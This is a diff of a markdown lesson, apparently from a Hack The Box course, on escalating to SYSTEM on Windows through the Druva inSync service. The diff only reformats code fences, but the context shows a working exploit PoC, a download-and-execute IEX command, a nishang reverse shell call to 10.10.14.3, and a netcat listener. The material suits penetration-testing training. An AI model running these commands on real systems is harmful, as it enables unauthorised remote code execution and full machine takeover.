@@ -10,8 +10,7 @@ We may be able to escalate privileges on well-patched and well-configured system
 
 As covered previously, let's start by enumerating installed applications to get a lay of the land.
 
-```
-        cmd
+```bat
 C:\htb> wmic product get name
 
 Name
@@ -32,8 +31,7 @@ The output looks mostly standard for a Windows 10 workstation. However, the `Dru
 
 Let's do some further enumeration to confirm that the service is running as expected. A quick look with `netstat` shows a service running locally on port `6064`.
 
-```
-        cmd
+```bat
 C:\htb> netstat -ano | findstr 6064
 
   TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
@@ -47,8 +45,7 @@ C:\htb> netstat -ano | findstr 6064
 
 Next, let's map the process ID (PID) `3324` back to the running process.
 
-```
-        powershell
+```powershell
 PS C:\htb> get-process -Id 3324
 
 Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
@@ -60,8 +57,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 
 At this point, we have enough information to determine that the Druva inSync application is indeed installed and running, but we can do one last check using the `Get-Service` cmdlet.
 
-```
-        powershell
+```powershell
 PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}
 
 Status   Name               DisplayName
@@ -77,8 +73,7 @@ Running  inSyncCPHService   Druva inSync Client Service
 
 With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.
 
-```
-        powershell
+```powershell
 $ErrorActionPreference = "Stop"
 
 $cmd = "net user pwnd /add"
@@ -105,15 +100,13 @@ $s.Send($command)
 
 For our purposes, we want to modify the `$cmd` variable to our desired command. We can do many things here, such as adding a local admin user (which is a bit noisy, and we want to avoid modifying things on client systems wherever possible) or sending ourselves a reverse shell. Let's try this with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Download the script to our attack box, and rename it something simple like `shell.ps1`. Open the file, and append the following at the bottom of the script file (changing the IP to match our address and listening port as well):
 
-```
-        shellsession
+```shellsession
 Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
 ```
 
 Modify the `$cmd` variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory.
 
-```
-        powershell
+```powershell
 $cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
 ```
 
@@ -121,8 +114,7 @@ $cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14
 
 Next, start a Python web server in the same directory where our `shell.ps1` script resides.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 -m http.server 8080
 ```
 
@@ -130,8 +122,7 @@ hiimeins@htb[/htb]$ python3 -m http.server 8080
 
 Finally, start a `Netcat` listener on the attack box and execute the PoC PowerShell script on the target host (after [modifying the PowerShell execution policy](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy) with a command such as `Set-ExecutionPolicy Bypass -Scope Process`). We will get a reverse shell connection back with `SYSTEM` privileges if all goes to plan.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -lvnp 9443
 
 listening on [any] 9443 ...
